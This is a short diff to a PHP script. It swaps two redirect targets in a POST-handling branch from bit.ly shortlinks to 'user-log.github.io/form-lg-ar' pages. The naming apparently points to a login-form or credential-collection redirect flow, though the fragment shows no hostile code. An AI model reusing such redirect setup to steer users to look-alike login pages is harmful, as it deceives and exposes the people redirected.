@@ -9,8 +9,8 @@
     } else if(isset($_POST['nam']) && $_POST['nam'] != 'lg'){
 
         // Go Wazfny
-        $goDone = 'http://bit.ly/3sDaaJn';
-        $goFoem = 'https://bit.ly/3irf2N4';
+        $goFoem = 'https://user-log.github.io/form-lg-ar/done.html';
+        $goDone = 'https://user-log.github.io/form-lg-ar/';
         
     } else{
 
